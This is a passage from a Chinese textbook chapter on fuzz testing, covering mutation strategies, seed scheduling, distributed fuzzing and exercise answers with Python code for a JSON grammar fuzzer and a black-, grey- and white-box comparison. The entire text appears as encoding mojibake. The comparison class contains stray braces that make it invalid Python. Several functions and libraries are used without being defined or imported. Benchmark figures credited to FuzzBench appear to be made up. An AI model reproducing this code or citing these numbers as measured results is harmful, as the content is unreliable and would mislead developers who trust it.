  - å››ä½ç¿»è½¬ï¼šç¿»è½¬åŠå­—èŠ‚ï¼Œå¸¸ç”¨äºå‘ç°è¾¹ç•Œé”™è¯¯
- **ç®—æœ¯å˜å¼‚**ï¼š
  - æ•´æ•°åŠ å‡ï¼šå¯¹å­—èŠ‚å€¼è¿›è¡ŒÂ±1ã€Â±16ã€Â±128ç­‰æ“ä½œ
  - è¾¹ç•Œå€¼æµ‹è¯•ï¼šæ’å…¥0ã€-1ã€MAX_INTç­‰ç‰¹æ®Šå€¼
  - æº¢å‡ºæµ‹è¯•ï¼šæ•…æ„åˆ¶é€ æ•´æ•°æº¢å‡ºæ¡ä»¶
- **ä¼˜åŠ¿**ï¼šå®Œå¤‡æ€§å¥½ï¼Œä¸ä¼šé—æ¼æ˜æ˜¾çš„è¾¹ç•Œæƒ…å†µ

**2. æ··æ²Œå˜å¼‚ï¼ˆHavoc Mutationsï¼‰**
- **éšæœºç»„åˆç­–ç•¥**ï¼šåœ¨å•æ¬¡å˜å¼‚ä¸­åº”ç”¨å¤šä¸ªéšæœºæ“ä½œ
- **å¸¸è§æ“ä½œç±»å‹**ï¼š
  - éšæœºä½ç¿»è½¬ï¼šåœ¨éšæœºä½ç½®ç¿»è½¬éšæœºæ•°é‡çš„ä½
  - å­—èŠ‚æ’å…¥/åˆ é™¤ï¼šæ”¹å˜è¾“å…¥é•¿åº¦
  - å­—èŠ‚æ›¿æ¢ï¼šç”¨éšæœºå€¼æ›¿æ¢å­—èŠ‚
  - å—äº¤æ¢ï¼šäº¤æ¢è¾“å…¥ä¸­çš„æ•°æ®å—
  - å—å¤åˆ¶ï¼šå¤åˆ¶å¹¶æ’å…¥æ•°æ®å—
- **å˜å¼‚å¼ºåº¦æ§åˆ¶**ï¼šé€šå¸¸åº”ç”¨1-16ä¸ªéšæœºæ“ä½œ
- **ä¼˜åŠ¿**ï¼šèƒ½äº§ç”Ÿæ„æƒ³ä¸åˆ°çš„è¾“å…¥ç»„åˆï¼Œå‘ç°æ·±å±‚bug

**3. æ‹¼æ¥å˜å¼‚ï¼ˆSplice Mutationsï¼‰**
- **è·¨è¾“å…¥ç»„åˆ**ï¼šå°†ä¸¤ä¸ªä¸åŒçš„æœ‰æ•ˆè¾“å…¥æ‹¼æ¥
- **æ‹¼æ¥ç‚¹é€‰æ‹©**ï¼šåŸºäºç»“æ„ç›¸ä¼¼æ€§æˆ–éšæœºé€‰æ‹©
- **ä¿æŒæœ‰æ•ˆæ€§**ï¼šå°½é‡ä¿æŒè¾“å…¥çš„åŸºæœ¬ç»“æ„
- **ä¼˜åŠ¿**ï¼šç»“åˆå¤šä¸ªæœ‰æ•ˆè¾“å…¥çš„ç‰¹å¾ï¼Œæ¢ç´¢æ–°çš„çŠ¶æ€ç»„åˆ

**4. å­—å…¸åŸºå˜å¼‚ï¼ˆDictionary-based Mutationsï¼‰**
- **é¢†åŸŸçŸ¥è¯†åº”ç”¨**ï¼šä½¿ç”¨é¢„å®šä¹‰çš„å…³é”®è¯å’Œæ¨¡å¼
- **å­—å…¸æ¥æº**ï¼š
  - é™æ€å­—å…¸ï¼šåè®®å…³é”®å­—ã€APIåç§°ã€é­”æœ¯å€¼
  - åŠ¨æ€å­—å…¸ï¼šä»æ‰§è¡Œä¸­å­¦ä¹ çš„å­—ç¬¦ä¸²å¸¸é‡
  - è¯­æ³•å­—å…¸ï¼šåŸºäºæ ¼å¼è§„èŒƒçš„ç»“æ„åŒ–tokens
- **å˜å¼‚æ“ä½œ**ï¼š
  - Tokenæ›¿æ¢ï¼šç”¨å­—å…¸ä¸­çš„tokenæ›¿æ¢è¾“å…¥éƒ¨åˆ†
  - Tokenæ’å…¥ï¼šåœ¨å…³é”®ä½ç½®æ’å…¥token
  - Tokenç»„åˆï¼šå¤šä¸ªtokençš„æ’åˆ—ç»„åˆ
- **ä¼˜åŠ¿**ï¼šå¿«é€Ÿé€šè¿‡è¾“å…¥éªŒè¯ï¼Œæ·±å…¥æµ‹è¯•æ ¸å¿ƒé€»è¾‘

### 17.2.3 è¾“å…¥ç§å­ä¼˜åŒ–

é«˜æ•ˆçš„ç§å­è°ƒåº¦å’Œèƒ½é‡åˆ†é…ï¼š

**ç§å­è°ƒåº¦å’Œèƒ½é‡åˆ†é…ç­–ç•¥**ï¼š

é«˜æ•ˆçš„ç§å­è°ƒåº¦æ˜¯ç°ä»£æ¨¡ç³Šæµ‹è¯•çš„å…³é”®ä¼˜åŒ–ç‚¹ï¼Œå®ƒå†³å®šäº†å¦‚ä½•åˆ†é…æœ‰é™çš„è®¡ç®—èµ„æºï¼š

**1. ç§å­ç®¡ç†æ¶æ„**
- **ç§å­é˜Ÿåˆ—**ï¼šç»´æŠ¤å¾…æµ‹è¯•è¾“å…¥çš„ä¼˜å…ˆçº§é˜Ÿåˆ—
- **æ‰§è¡Œç»Ÿè®¡**ï¼šè®°å½•æ¯ä¸ªç§å­çš„å†å²æ‰§è¡Œä¿¡æ¯
- **åŠ¨æ€è¯„åˆ†**ï¼šæ ¹æ®ç§å­è¡¨ç°å®æ—¶è°ƒæ•´ä¼˜å…ˆçº§

**2. èƒ½é‡è®¡ç®—å› ç´ **

**è¦†ç›–ç‡è´¡çŒ®ï¼ˆæƒé‡æœ€é«˜ï¼‰**ï¼š
- æ–°è·¯å¾„å‘ç°èƒ½åŠ›
- è¦†ç›–ç‡å¢é•¿é€Ÿåº¦
- ç‹¬ç‰¹è¾¹çš„æ•°é‡

**è·¯å¾„æ·±åº¦è¯„åˆ†**ï¼š
- åˆ°è¾¾ç¨‹åºæ·±å±‚é€»è¾‘çš„ç§å­æ›´æœ‰ä»·å€¼
- è°ƒç”¨æ ˆæ·±åº¦ä½œä¸ºå‚è€ƒ
- å¾ªç¯åµŒå¥—å±‚æ•°è€ƒè™‘

**ç¨€æœ‰åº¦è¯„åˆ†**ï¼š
- è§¦å‘ç½•è§ä»£ç è·¯å¾„çš„ç§å­
- åŸºäºå…¨å±€æ‰§è¡Œé¢‘ç‡ç»Ÿè®¡
- é€†å‘åŠ æƒï¼šè¶Šç½•è§æƒé‡è¶Šé«˜

**æ–°é²œåº¦è¯„åˆ†**ï¼š
- æœ€è¿‘å‘ç°çš„ç§å­å¯èƒ½æœ‰æ›´å¤šæ½œåŠ›
- æ—¶é—´è¡°å‡å‡½æ•°
- é˜²æ­¢è¿‡åº¦å…³æ³¨è€ç§å­

**ç§å­å¤§å°è¯„åˆ†**ï¼š
- å°ç§å­æ‰§è¡Œæ•ˆç‡é«˜
- å˜å¼‚ç©ºé—´ç›¸å¯¹é›†ä¸­
- ä¾¿äºå¿«é€Ÿè¿­ä»£

**3. AFLåŠŸç‡è°ƒåº¦ç®—æ³•**

**åŸºç¡€èƒ½é‡åˆ†é…**ï¼š
- ç»¼åˆå¤šå› ç´ è®¡ç®—åŸºç¡€èƒ½é‡å€¼
- è¦†ç›–ç‡å› ç´ æƒé‡ï¼š100
- æ·±åº¦å› ç´ æƒé‡ï¼š50
- ç¨€æœ‰åº¦æƒé‡ï¼š80
- æ–°é²œåº¦æƒé‡ï¼š20
- å¤§å°å› ç´ æƒé‡ï¼š10

**æŒ‡æ•°è¡°å‡æœºåˆ¶**ï¼š
- é˜²æ­¢åœ¨å•ä¸ªç§å­ä¸ŠèŠ±è´¹è¿‡å¤šæ—¶é—´
- è¡°å‡å› å­ï¼š0.95
- éšç€æ‰§è¡Œæ¬¡æ•°å¢åŠ ï¼Œèƒ½é‡æŒ‡æ•°ä¸‹é™

**èƒ½é‡è¾¹ç•Œæ§åˆ¶**ï¼š
- æœ€å°èƒ½é‡ï¼š1ï¼ˆä¿è¯æ¯ä¸ªç§å­éƒ½æœ‰æœºä¼šï¼‰
- æœ€å¤§èƒ½é‡ï¼š10000ï¼ˆé˜²æ­¢èµ„æºå„æ–­ï¼‰
- åŠ¨æ€è°ƒæ•´èŒƒå›´

### 17.2.4 å¹¶è¡Œå’Œåˆ†å¸ƒå¼æ¨¡ç³Šæµ‹è¯•

**å¹¶è¡Œå’Œåˆ†å¸ƒå¼æ¨¡ç³Šæµ‹è¯•æ¶æ„**ï¼š

ç°ä»£æ¨¡ç³Šæµ‹è¯•é€šè¿‡å¹¶è¡ŒåŒ–å’Œåˆ†å¸ƒå¼æ¶æ„æ¥æå‡æ•ˆç‡ï¼š

**1. åˆ†å¸ƒå¼æ¶æ„è®¾è®¡**

**æ ¸å¿ƒç»„ä»¶**ï¼š
- **å…¨å±€è¯­æ–™åº“**ï¼šä½¿ç”¨åŒæ­¥æœºåˆ¶å…±äº«æœ‰ä»·å€¼çš„è¾“å…¥
- **å…¨å±€è¦†ç›–ç‡æ˜ å°„**ï¼šç»Ÿä¸€è®°å½•æ‰€æœ‰å·¥ä½œè¿›ç¨‹çš„è¦†ç›–ä¿¡æ¯
- **å·¥ä½œè¿›ç¨‹æ± **ï¼šç‹¬ç«‹è¿è¡Œçš„æ¨¡ç³Šæµ‹è¯•å®ä¾‹

**2. å·¥ä½œè¿›ç¨‹ç®¡ç†**

**è¿›ç¨‹åˆ›å»ºå’Œåˆå§‹åŒ–**ï¼š
- æ ¹æ®å¯ç”¨CPUæ ¸å¿ƒæ•°åˆ›å»ºå·¥ä½œè¿›ç¨‹
- æ¯ä¸ªè¿›ç¨‹ç‹¬ç«‹çš„æ‰§è¡Œç¯å¢ƒ
- å…±äº«å…¨å±€çŠ¶æ€çš„è®¿é—®æƒé™
- åˆ†é…å”¯ä¸€çš„å·¥ä½œID

**ç­–ç•¥åˆ†é…æœºåˆ¶**ï¼š
- **æ¢ç´¢ç­–ç•¥ï¼ˆExploreï¼‰**ï¼šä¸“æ³¨äºå‘ç°æ–°çš„ä»£ç è·¯å¾„
- **å¼€å‘ç­–ç•¥ï¼ˆExploitï¼‰**ï¼šæ·±å…¥æµ‹è¯•å·²çŸ¥çš„æœ‰è¶£è·¯å¾„
- **æ··æ²Œç­–ç•¥ï¼ˆHavocï¼‰**ï¼šä½¿ç”¨æ¿€è¿›çš„éšæœºå˜å¼‚
- **ç¡®å®šæ€§ç­–ç•¥ï¼ˆDeterministicï¼‰**ï¼šç³»ç»ŸåŒ–çš„å®Œæ•´æµ‹è¯•
- è½®è¯¢åˆ†é…ç¡®ä¿ç­–ç•¥å¤šæ ·æ€§

**3. åŒæ­¥æœºåˆ¶è®¾è®¡**

**å®šæœŸåŒæ­¥ç­–ç•¥**ï¼š
- åŒæ­¥å‘¨æœŸï¼šé€šå¸¸10ç§’ä¸€æ¬¡
- é¿å…è¿‡äºé¢‘ç¹çš„åŒæ­¥å¼€é”€
- ä¿è¯æ–°å‘ç°çš„åŠæ—¶å…±äº«

**åŒæ­¥æµç¨‹**ï¼š
1. **æ”¶é›†é˜¶æ®µ**ï¼š
   - ä»æ‰€æœ‰å·¥ä½œè¿›ç¨‹æ”¶é›†æ–°å‘ç°çš„ç§å­
   - å»é‡å’ŒéªŒè¯
   - è¯„ä¼°ç§å­ä»·å€¼

2. **æ›´æ–°é˜¶æ®µ**ï¼š
   - æ£€æŸ¥æ˜¯å¦æœ‰æ–°çš„è¦†ç›–ç‡
   - æ›´æ–°å…¨å±€è¯­æ–™åº“
   - ç»´æŠ¤è¦†ç›–ç‡æ˜ å°„

3. **åˆ†å‘é˜¶æ®µ**ï¼š
   - å°†æœ‰ä»·å€¼çš„æ–°ç§å­å¹¿æ’­ç»™æ‰€æœ‰å·¥ä½œè¿›ç¨‹
   - ç¡®ä¿æ‰€æœ‰è¿›ç¨‹éƒ½èƒ½å—ç›Šäºæ–°å‘ç°
   - é¿å…é‡å¤å·¥ä½œ

**4. æ€§èƒ½ä¼˜åŒ–è€ƒè™‘**

**è´Ÿè½½å‡è¡¡**ï¼š
- åŠ¨æ€è°ƒæ•´å·¥ä½œåˆ†é…
- ç›‘æ§å„è¿›ç¨‹çš„æ•ˆç‡
- è‡ªåŠ¨è¿ç§»è´Ÿè½½

**é€šä¿¡ä¼˜åŒ–**ï¼š
- æ‰¹é‡ä¼ è¾“å‡å°‘å¼€é”€
- å‹ç¼©å¤§å‹ç§å­æ•°æ®
- å¢é‡åŒæ­¥æœºåˆ¶

**å®¹é”™è®¾è®¡**ï¼š
- å·¥ä½œè¿›ç¨‹å´©æºƒè‡ªåŠ¨é‡å¯
- æ£€æŸ¥ç‚¹æœºåˆ¶ä¿å­˜è¿›åº¦
- åˆ†å¸ƒå¼å­˜å‚¨é˜²æ­¢æ•°æ®ä¸¢å¤±

### ç»ƒä¹  17.2

1. **è®¾è®¡é¢˜**ï¼šè®¾è®¡ä¸€ä¸ªé’ˆå¯¹JSONè§£æå™¨çš„è¯­æ³•æ„ŸçŸ¥æ¨¡ç³Šå™¨ã€‚

<details>
<summary>å‚è€ƒç­”æ¡ˆ</summary>

JSONè§£æå™¨çš„è¯­æ³•æ„ŸçŸ¥æ¨¡ç³Šå™¨è®¾è®¡ï¼š

```python
import json
import random
from typing import Any, Dict, List, Union

class JSONGrammarFuzzer:
    def __init__(self):
        self.max_depth = 5
        self.max_array_length = 10
        self.max_string_length = 100
        self.max_number = 1e10
        
        # JSONè¯­æ³•è§„åˆ™
        self.generators = {
            'value': self.generate_value,
            'object': self.generate_object,
            'array': self.generate_array,
            'string': self.generate_string,
            'number': self.generate_number,
            'boolean': self.generate_boolean,
            'null': self.generate_null
        }
        
        # è¾¹ç•Œæµ‹è¯•å€¼
        self.edge_cases = {
            'strings': [
                '""',
                '"\\u0000"',
                '"\\uFFFF"',
                '"' + 'A' * 1000000 + '"',
                '"\\\\"',
                '"\\n\\r\\t"',
                '"\\u0022"',  # å¼•å·
                '"\\uD834\\uDD1E"'  # ä»£ç†å¯¹
            ],
            'numbers': [
                0, -0, 1, -1,
                0.0, -0.0,
                1e308, -1e308,  # æ¥è¿‘æµ®ç‚¹æ•°æé™
                2.2250738585072014e-308,  # æœ€å°æ­£æ•°
                'Infinity', '-Infinity', 'NaN'
            ],
            'special': [
                '[]', '{}', 
                '[{}]', '{"":0}',
                '[[[[[[]]]]]]'  # æ·±åº¦åµŒå¥—
            ]
        }
    
    def generate_value(self, depth=0):
        """ç”ŸæˆJSONå€¼"""
        if depth >= self.max_depth:
            # è¾¾åˆ°æœ€å¤§æ·±åº¦ï¼Œåªç”Ÿæˆç®€å•ç±»å‹
            types = ['string', 'number', 'boolean', 'null']
        else:
            types = ['object', 'array', 'string', 'number', 'boolean', 'null']
        
        # åå‘äºç”Ÿæˆå¤æ‚ç±»å‹
        weights = {
            'object': 3 if depth < 2 else 1,
            'array': 3 if depth < 2 else 1,
            'string': 2,
            'number': 2,
            'boolean': 1,
            'null': 1
        }
        
        value_type = self.weighted_choice(types, weights)
        return self.generators[value_type](depth)
    
    def generate_object(self, depth=0):
        """ç”ŸæˆJSONå¯¹è±¡"""
        obj = {}
        num_keys = random.randint(0, 10)
        
        for _ in range(num_keys):
            key = self.generate_key()
            value = self.generate_value(depth + 1)
            obj[key] = value
        
        return obj
    
    def generate_key(self):
        """ç”Ÿæˆå¯¹è±¡é”®"""
        strategies = [
            lambda: self.random_string(random.randint(1, 20)),
            lambda: random.choice(self.edge_cases['strings']).strip('"'),
            lambda: '',  # ç©ºé”®
            lambda: 'a' * 1000,  # é•¿é”®
            lambda: '\u0000',  # ç‰¹æ®Šå­—ç¬¦
        ]
        
        return random.choice(strategies)()
    
    def mutate_json(self, json_obj):
        """å˜å¼‚å·²æœ‰çš„JSONå¯¹è±¡"""
        mutations = [
            self.mutate_type,
            self.mutate_structure,
            self.mutate_values,
            self.inject_malformed,
            self.mutate_depth
        ]
        
        # åº”ç”¨éšæœºå˜å¼‚
        mutator = random.choice(mutations)
        return mutator(json_obj)
    
    def mutate_structure(self, obj):
        """ç»“æ„å˜å¼‚"""
        if isinstance(obj, dict):
            mutations = [
                # åˆ é™¤é”®
                lambda: {k: v for k, v in obj.items() if random.random() > 0.3},
                # æ·»åŠ é”®
                lambda: {**obj, self.generate_key(): self.generate_value()},
                # é‡å¤é”®ï¼ˆé€šè¿‡å­—ç¬¦ä¸²æ„å»ºï¼‰
                lambda: self.create_duplicate_keys(obj),
                # å¾ªç¯å¼•ç”¨ï¼ˆä¸èƒ½ç›´æ¥åœ¨JSONä¸­å®ç°ï¼‰
            ]
        elif isinstance(obj, list):
            mutations = [
                # åˆ é™¤å…ƒç´ 
                lambda: [x for x in obj if random.random() > 0.3],
                # æ·»åŠ å…ƒç´ 
                lambda: obj + [self.generate_value()],
                # æ‰“ä¹±é¡ºåº
                lambda: random.sample(obj, len(obj)),
                # åµŒå¥—æ·±åº¦å¢åŠ 
                lambda: [obj] * random.randint(2, 5)
            ]
        else:
            return obj
        
        return random.choice(mutations)()
    
    def inject_malformed(self, obj):
        """æ³¨å…¥æ ¼å¼é”™è¯¯"""
        json_str = json.dumps(obj)
        
        malformations = [
            # ç¼ºå°‘å¼•å·
            lambda s: s.replace('"', '', 1),
            # ç¼ºå°‘æ‹¬å·
            lambda s: s[:-1] if s[-1] in '}]' else s,
            # é¢å¤–é€—å·
            lambda s: s.replace('}', ',}').replace(']', ',]'),
            # éæ³•è½¬ä¹‰
            lambda s: s.replace('\\', '\\\\\\'),
            # æ³¨é‡Šï¼ˆJSONä¸æ”¯æŒï¼‰
            lambda s: s[:len(s)//2] + '/* comment */' + s[len(s)//2:],
            # å•å¼•å·
            lambda s: s.replace('"', "'"),
            # å°¾éšé€—å·
            lambda s: self.add_trailing_comma(s)
        ]
        
        malform = random.choice(malformations)
        return malform(json_str)
    
    def generate_stress_tests(self):
        """ç”Ÿæˆå‹åŠ›æµ‹è¯•ç”¨ä¾‹"""
        tests = []
        
        # æ·±åº¦åµŒå¥—
        deep_nested = {'a': {}}
        current = deep_nested['a']
        for i in range(1000):
            current['a'] = {}
            current = current['a']
        tests.append(json.dumps(deep_nested))
        
        # å¤§æ•°ç»„
        large_array = [0] * 1000000
        tests.append(json.dumps(large_array))
        
        # å¤§å¯¹è±¡
        large_object = {str(i): i for i in range(100000)}
        tests.append(json.dumps(large_object))
        
        # Unicodeå‹åŠ›
        unicode_stress = {
            'emoji': 'ğŸ˜€' * 1000,
            'chinese': 'ä¸­' * 1000,
            'rtl': '×' * 1000,
            'combining': 'Ã©' * 1000
        }
        tests.append(json.dumps(unicode_stress))
        
        return tests
    
    def differential_testing(self, json_str):
        """å·®å¼‚æµ‹è¯•ï¼šæ¯”è¾ƒä¸åŒè§£æå™¨çš„è¡Œä¸º"""
        parsers = [
            ('standard', json.loads),
            ('rapidjson', rapidjson.loads),
            ('ujson', ujson.loads),
            ('simplejson', simplejson.loads)
        ]
        
        results = {}
        for name, parser in parsers:
            try:
                result = parser(json_str)
                results[name] = ('success', result)
            except Exception as e:
                results[name] = ('error', str(e))
        
        # æ£€æŸ¥ä¸ä¸€è‡´
        if len(set(r[0] for r in results.values())) > 1:
            return {'inconsistency': True, 'results': results}
        
        return {'inconsistency': False}
    
    def guided_fuzzing_loop(self, target_parser):
        """ä¸»æ¨¡ç³Šæµ‹è¯•å¾ªç¯"""
        corpus = []
        coverage_map = {}
        crashes = []
        
        # åˆå§‹ç§å­
        corpus.extend([
            '{}', '[]', 'null', 'true', 'false',
            '0', '"string"', '[1,2,3]', '{"a":1}'
        ])
        
        iteration = 0
        while iteration < 100000:
            # é€‰æ‹©ç§å­
            if corpus and random.random() < 0.8:
                seed = random.choice(corpus)
                try:
                    seed_obj = json.loads(seed)
                    # å˜å¼‚
                    if random.random() < 0.5:
                        mutated = self.mutate_json(seed_obj)
                        test_input = json.dumps(mutated)
                    else:
                        test_input = self.inject_malformed(seed_obj)
                except:
                    # ç§å­æœ¬èº«å¯èƒ½æ˜¯æ¶æ„çš„
                    test_input = self.mutate_string(seed)
            else:
                # ç”Ÿæˆæ–°è¾“å…¥
                test_input = json.dumps(self.generate_value())
            
            # æµ‹è¯•
            try:
                with timeout(0.1):  # 100msè¶…æ—¶
                    result = target_parser(test_input)
                    
                # æ”¶é›†è¦†ç›–ç‡
                coverage = get_coverage()
                if self.is_new_coverage(coverage, coverage_map):
                    corpus.append(test_input)
                    coverage_map[hash_coverage(coverage)] = coverage
                    
            except TimeoutError:
                crashes.append(('timeout', test_input))
            except MemoryError:
                crashes.append(('memory', test_input))
            except Exception as e:
                crashes.append((str(e), test_input))
            
            iteration += 1
            
            if iteration % 1000 == 0:
                print(f"Iteration {iteration}: "
                      f"Corpus size: {len(corpus)}, "
                      f"Crashes: {len(crashes)}")
        
        return corpus, crashes

# ä½¿ç”¨ç¤ºä¾‹
fuzzer = JSONGrammarFuzzer()

# ç”Ÿæˆæµ‹è¯•ç”¨ä¾‹
for _ in range(10):
    test_case = fuzzer.generate_value()
    print(json.dumps(test_case, indent=2))

# è¿è¡Œæ¨¡ç³Šæµ‹è¯•
corpus, crashes = fuzzer.guided_fuzzing_loop(json.loads)
```

è¿™ä¸ªè®¾è®¡åŒ…å«ï¼š
1. è¯­æ³•æ„ŸçŸ¥çš„ç”Ÿæˆ
2. æ™ºèƒ½å˜å¼‚ç­–ç•¥
3. è¾¹ç•Œå€¼æµ‹è¯•
4. å‹åŠ›æµ‹è¯•ç”Ÿæˆ
5. å·®å¼‚æµ‹è¯•æ”¯æŒ
6. è¦†ç›–ç‡å¼•å¯¼

</details>

2. **åˆ†æé¢˜**ï¼šæ¯”è¾ƒé»‘ç›’ã€ç°ç›’å’Œç™½ç›’æ¨¡ç³Šæµ‹è¯•çš„ä¼˜ç¼ºç‚¹ã€‚

<details>
<summary>å‚è€ƒç­”æ¡ˆ</summary>

é»‘ç›’ã€ç°ç›’å’Œç™½ç›’æ¨¡ç³Šæµ‹è¯•çš„æ¯”è¾ƒï¼š

| ç‰¹æ€§ | é»‘ç›’æ¨¡ç³Šæµ‹è¯• | ç°ç›’æ¨¡ç³Šæµ‹è¯• | ç™½ç›’æ¨¡ç³Šæµ‹è¯• |
|------|-------------|-------------|-------------|
| **æ‰€éœ€ä¿¡æ¯** |
| ç¨‹åºçŸ¥è¯† | æ— éœ€ | éƒ¨åˆ†ï¼ˆè¦†ç›–ç‡ï¼‰ | å®Œæ•´ï¼ˆæºç /äºŒè¿›åˆ¶ï¼‰ |
| è¾“å…¥æ ¼å¼ | å¯é€‰ | æœ‰å¸®åŠ© | é€šå¸¸éœ€è¦ |
| **æŠ€æœ¯ç‰¹ç‚¹** |
| ä¸»è¦æŠ€æœ¯ | éšæœºç”Ÿæˆ/å˜å¼‚ | è¦†ç›–ç‡åé¦ˆ | ç¬¦å·æ‰§è¡Œ/æ±¡ç‚¹åˆ†æ |
| å…¸å‹å·¥å…· | zzuf, Radamsa | AFL, libFuzzer | KLEE, S2E |
| **ä¼˜åŠ¿** |
| 1 | å®ç°ç®€å• | å¹³è¡¡æ•ˆç‡å’Œæ•ˆæœ | ç³»ç»Ÿæ€§æ¢ç´¢ |
| 2 | é€šç”¨æ€§å¼º | è‡ªåŠ¨è¿›åŒ– | å¯è¯æ˜è¦†ç›– |
| 3 | æ— éœ€æºç  | æŒç»­æ”¹è¿› | ç²¾ç¡®çº¦æŸæ±‚è§£ |
| 4 | å¿«é€Ÿéƒ¨ç½² | å¹¿æ³›é€‚ç”¨ | å®šå‘æµ‹è¯• |
| **åŠ£åŠ¿** |
| 1 | æ•ˆç‡ä½ | éœ€è¦æ’æ¡© | è·¯å¾„çˆ†ç‚¸ |
| 2 | ç›²ç›®æ¢ç´¢ | åˆå§‹è¯­æ–™åº“ä¾èµ– | è®¡ç®—å¼€é”€å¤§ |
| 3 | éš¾ä»¥æ·±å…¥ | å±€éƒ¨æœ€ä¼˜ | æ‰©å±•æ€§å·® |
| 4 | è¦†ç›–ç‡ä½ | è¯­ä¹‰ç›²ç›® | å®ç°å¤æ‚ |

**è¯¦ç»†åˆ†æ**ï¼š

```python
class FuzzingComparison:
    def __init__(self):
        self.metrics = {
            'coverage': 0,
            'bugs_found': 0,
            'time_to_first_bug': float('inf'),
            'computational_cost': 0
        }
    
    def blackbox_characteristics(self):
        return {
            'approach': 'çº¯éšæœºæˆ–åŸºäºæ¨¡æ¿',
            'feedback': 'ä»…å´©æºƒä¿¡æ¯',
            'evolution': 'æ— è¿›åŒ–èƒ½åŠ›',
            'example': '''
            # ç®€å•çš„é»‘ç›’æ¨¡ç³Šå™¨
            while True:
                input_data = generate_random_bytes()
                result = run_target(input_data)
                if result.crashed:
                    save_crash(input_data)
            ''',
            'use_cases': [
                'å¿«é€Ÿåˆæ­¥æµ‹è¯•',
                'å°é—­ç³»ç»Ÿæµ‹è¯•',
                'åè®®ä¸€è‡´æ€§æµ‹è¯•',
                'å›å½’æµ‹è¯•'
            ]
        }
    
    def greybox_characteristics(self):
        return {
            'approach': 'è¦†ç›–ç‡å¼•å¯¼çš„è¿›åŒ–',
            'feedback': 'ä»£ç è¦†ç›–ç‡+å´©æºƒ',
            'evolution': 'åŸºäºåé¦ˆçš„æ”¹è¿›',
            'example': '''
            # AFLé£æ ¼çš„ç°ç›’æ¨¡ç³Šå™¨
            corpus = initial_seeds
            coverage_map = {}
            
            while True:
                seed = select_seed(corpus)
                mutated = mutate(seed)
                result, coverage = run_with_coverage(mutated)
                
                if has_new_coverage(coverage):
                    corpus.add(mutated)
                    update_coverage_map(coverage)
                
                if result.crashed:
                    save_crash(mutated)
            ''',
            'use_cases': [
                'é€šç”¨å®‰å…¨æµ‹è¯•',
                'æŒç»­é›†æˆ',
                'å¤§è§„æ¨¡æ¼æ´å‘ç°',
                'æœªçŸ¥æ¼æ´æŒ–æ˜'
            ]
        }
    
    def whitebox_characteristics(self):
        return {
            'approach': 'ç¨‹åºåˆ†æ+çº¦æŸæ±‚è§£',
            'feedback': 'è·¯å¾„çº¦æŸ+ç¬¦å·æ‰§è¡Œ',
            'evolution': 'ç³»ç»Ÿæ€§è·¯å¾„æ¢ç´¢',
            'example': '''
            # ç¬¦å·æ‰§è¡Œé£æ ¼çš„ç™½ç›’æ¨¡ç³Šå™¨
            symbolic_state = create_symbolic_input()
            worklist = [(entry_point, symbolic_state)]
            
            while worklist:
                location, state = worklist.pop()
                
                if is_branch(location):
                    constraint = get_branch_constraint(location, state)
                    
                    # ä¸¤ä¸ªåˆ†æ”¯éƒ½æ¢ç´¢
                    if is_satisfiable(state.constraints + constraint):
                        worklist.append((true_branch, state.fork(constraint)))
                    
                    if is_satisfiable(state.constraints + NOT(constraint)):
                        worklist.append((false_branch, state.fork(NOT(constraint))))
                
                if is_bug(location):
                    concrete = solve_constraints(state.constraints)
                    save_bug_input(concrete)
            ''',
            'use_cases': [
                'éªŒè¯å…³é”®å±æ€§',
                'å¯»æ‰¾ç‰¹å®šæ¼æ´',
                'è¡¥ä¸éªŒè¯',
                'å®‰å…¨æ€§è¯æ˜'
            ]
        }
    }
    
    def hybrid_approaches(self):
        """æ··åˆæ–¹æ³•ç»“åˆå¤šç§æŠ€æœ¯çš„ä¼˜åŠ¿"""
        return {
            'driller': {
                'description': 'ç»“åˆAFLå’Œç¬¦å·æ‰§è¡Œ',
                'strategy': 'æ¨¡ç³Šæµ‹è¯•å¡ä½æ—¶ç”¨ç¬¦å·æ‰§è¡Œçªç ´',
                'advantage': 'å…‹æœå„è‡ªå±€é™æ€§'
            },
            'qsym': {
                'description': 'å¿«é€Ÿç¬¦å·æ‰§è¡Œè¾…åŠ©æ¨¡ç³Šæµ‹è¯•',
                'strategy': 'ä¼˜åŒ–çš„çº¦æŸæ±‚è§£',
                'advantage': 'å®ç”¨çš„ç™½ç›’æŠ€æœ¯'
            },
            'pangolin': {
                'description': 'ç¥ç»ç½‘ç»œå¼•å¯¼çš„å˜å¼‚',
                'strategy': 'å­¦ä¹ æœ‰æ•ˆçš„å˜å¼‚æ¨¡å¼',
                'advantage': 'æ™ºèƒ½åŒ–çš„è¾“å…¥ç”Ÿæˆ'
            }
        }
    }
    
    def performance_comparison(self):
        """åŸºäºå®è¯ç ”ç©¶çš„æ€§èƒ½å¯¹æ¯”"""
        # åŸºäºGoogleçš„FuzzBenchåŸºå‡†æµ‹è¯•
        benchmark_results = {
            'coverage_24h': {
                'blackbox': 45,  # ç›¸å¯¹å€¼
                'greybox': 85,
                'whitebox': 65,  # å—é™äºæ‰©å±•æ€§
                'hybrid': 95
            },
            'unique_bugs': {
                'blackbox': 12,
                'greybox': 67,
                'whitebox': 45,
                'hybrid': 89
            },
            'time_to_first_bug_minutes': {
                'blackbox': 180,
                'greybox': 15,
                'whitebox': 45,
                'hybrid': 10
            }
        }
        
        return benchmark_results
```

**é€‰æ‹©å»ºè®®**ï¼š

1. **é»‘ç›’æ¨¡ç³Šæµ‹è¯•**ï¼š
   - é€‚ç”¨äºï¼šå¿«é€Ÿæµ‹è¯•ã€æ— æºç åœºæ™¯ã€åˆæ­¥è¯„ä¼°
   - ä¸é€‚ç”¨äºï¼šæ·±åº¦æµ‹è¯•ã€å¤æ‚é€»è¾‘

2. **ç°ç›’æ¨¡ç³Šæµ‹è¯•**ï¼š
   - é€‚ç”¨äºï¼šå¤§å¤šæ•°åœºæ™¯ã€æŒç»­æµ‹è¯•ã€æ¼æ´æŒ–æ˜
   - ä¸é€‚ç”¨äºï¼šéœ€è¦å®Œæ•´è·¯å¾„è¦†ç›–è¯æ˜

3. **ç™½ç›’æ¨¡ç³Šæµ‹è¯•**ï¼š
   - é€‚ç”¨äºï¼šå…³é”®ä»£ç ã€ç‰¹å®šæ¼æ´ã€å½¢å¼åŒ–éªŒè¯
   - ä¸é€‚ç”¨äºï¼šå¤§å‹ç¨‹åºã€å¿«é€Ÿæµ‹è¯•

4. **æ··åˆæ–¹æ³•**ï¼š
   - ç»“åˆå¤šç§æŠ€æœ¯ä¼˜åŠ¿
   - æ ¹æ®æµ‹è¯•è¿›å±•åŠ¨æ€è°ƒæ•´ç­–ç•¥
